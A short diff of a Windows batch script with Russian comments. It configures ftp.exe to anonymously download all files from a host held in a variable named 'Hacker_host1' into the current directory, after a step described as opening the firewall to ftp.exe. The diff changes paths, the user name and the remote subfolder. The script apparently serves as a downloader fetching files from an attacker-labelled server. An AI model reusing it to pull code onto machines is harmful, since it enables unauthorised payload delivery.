@@ -18,7 +18,7 @@ rem Go to Temprorary Directory
 cd /d %curdir%
 
 ::Временный файл команд для утилиты FTP.exe
-set CommFTP="c:\pub1\Initial_Script.txt"
+set CommFTP="%TEMP%\Initial_Script.txt"
 
 
 rem Разрешаем все протоколы для ftp.exe в брандмауэре
@@ -29,19 +29,19 @@ set host=%Hacker_host1%
 rem FTP Port
 set port=21
 rem Ftp User
-set user=Anonymous
+set user=anonymous
 rem FTP Password
 set password=
 rem Основная папка
 set Mainfolder=
 rem Папка внутри FTP архива
-set SubFolder=Util
+set SubFolder=Exponenta
 rem Папка внутри FTP архива
 set SubFolder1=
 rem Маска для файлов
 set fileMask=*
 rem Локальный каталог
-set LocalFolder=%TEMP%
+set LocalFolder=%curdir%
  
  
 ::Генерируем файл FTP команд
